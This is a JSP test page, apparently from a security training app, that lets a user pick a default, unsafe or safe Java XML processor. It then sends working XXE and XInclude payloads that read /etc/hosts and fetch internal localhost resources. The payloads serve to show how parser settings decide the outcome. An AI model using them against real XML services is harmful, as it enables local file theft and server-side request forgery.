<%
    response.setHeader("Pragma", "no-cache");
    response.setHeader("Cache-Control", "no-cache");
    response.setDateHeader("Expires", 0);
%>
<%@ page contentType="text/html;charset=UTF-8" %>

<html>
<head>
    <title>XXE tests</title>
</head>
<body>

<fieldset>
    <legend>Select java XML processor:</legend>

    <div>
        <input type="radio" name="xmlProcessor" value="defaultXmlProcessor" id="defaultXmlProcessor" />
        <label for="defaultXmlProcessor">Use default XML processor</label>
    </div>

    <div>
        <input type="radio" name="xmlProcessor" value="unsafeXmlProcessor" id="unsafeXmlProcessor" checked />
        <label for="unsafeXmlProcessor">Use unsafe XML processor</label>
    </div>

    <div>
        <input type="radio" name="xmlProcessor" value="safeXmlProcessor" id="safeXmlProcessor" />
        <label for="safeXmlProcessor">Use safe XML processor</label>
    </div>
</fieldset>

<ul>
    <li><a href="javascript:useXxeToGetLocalFile_01()">Use XXE 1 - get local file</a></li>
    <li><a href="javascript:useXxeToGetHttpFileFromInternalNetwork_01()">Use XXE 2 - get internal network XML by HTTP</a></li>
    <li><a href="javascript:useXxeToGetHttpFileFromInternalNetwork_02()">Use XXE 3 - try to get data non-compatible with XML by HTTP (will <b>FAIL</b>)</a></li>
    <br/>
    <li><a href="javascript:useXIncludeToGetLocalFile_01()">Use XInclude 1 - get local file</a></li>
    <li><a href="javascript:useXIncludeToGetHttpFileFromInternalNetwork_01()">Use XInclude 1 - get internal network XML by HTTP</a></li>
    <li><a href="javascript:useXIncludeToGetHttpFileFromInternalNetwork_02()">Use XInclude 1 - get internal network non-XML by HTTP <b>(SUCCESS)</b></a></li>
</ul>


<%--suppress JSStringConcatenationToES6Template --%>
<script>
    function serviceEndPointUrl() {
        const selectedXmlProcessor = document.querySelector('input[name="xmlProcessor"]:checked').value;
        switch (selectedXmlProcessor) {
            case "defaultXmlProcessor": return "xml-endpoint.jsp";
            case "unsafeXmlProcessor" : return "xml-unsafe-endpoint.jsp";
            case "safeXmlProcessor"   : return "xml-safe-endpoint.jsp";
            default                   : throw "Error bla-bla bla bla..."
        }
    }


    function useXxeToGetLocalFile_01() {
        const req = new XMLHttpRequest();
        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
        req.open("POST", serviceEndPointUrl());
        // <%--suppress UnnecessaryUnicodeEscape --%>
        req.send(
            //'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:/etc/hosts"> ]>' +
            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:/etc/hosts"> ]>' +
            '<transfer><amount>&xxe;</amount></transfer>');
    }

    function useXxeToGetHttpFileFromInternalNetwork_01() {
        const req = new XMLHttpRequest();
        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
        req.open("POST", serviceEndPointUrl());
        // <%--suppress UnnecessaryUnicodeEscape --%>
        req.send(
            //   '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-xml-data.jsp"> ]>' +
            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-xml-data.jsp"> ]>' +
            '<transfer><amount>&xxe;</amount></transfer>');
    }

    function useXxeToGetHttpFileFromInternalNetwork_02() {
        const req = new XMLHttpRequest();
        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
        req.open("POST", serviceEndPointUrl());
        // <%--suppress UnnecessaryUnicodeEscape --%>
        req.send(
            //   '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-nonvalid-xml-data.jsp"> ]>' +
            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-nonvalid-xml-data.jsp"> ]>' +
            '<transfer><amount>&xxe;</amount></transfer>');
    }

    function useXIncludeToGetLocalFile_01() {
        const req = new XMLHttpRequest();
        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
        req.open("POST", serviceEndPointUrl());
        // <%--suppress UnnecessaryUnicodeEscape --%>
        const xml =
            '<transfer>' +
            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="file:///etc/hosts" parse="text"/></amount>' +
            '</transfer>'

        req.send(xml);
    }

    function useXIncludeToGetHttpFileFromInternalNetwork_01() {
        const req = new XMLHttpRequest();
        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
        req.open("POST", serviceEndPointUrl());
        // <%--suppress UnnecessaryUnicodeEscape --%>
        const xml =
            '<transfer>' +
            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-xml-data.jsp" parse="text"/></amount>' +
            '</transfer>'

        req.send(xml);
    }

    function useXIncludeToGetHttpFileFromInternalNetwork_02() {
        const req = new XMLHttpRequest();
        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
        req.open("POST", serviceEndPointUrl());
        // <%--suppress UnnecessaryUnicodeEscape --%>
        const xml =
            '<transfer>' +
            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-nonvalid-xml-data.jsp" parse="text"/></amount>' +
            '</transfer>'

        req.send(xml);
    }
</script>

</body>
</html>
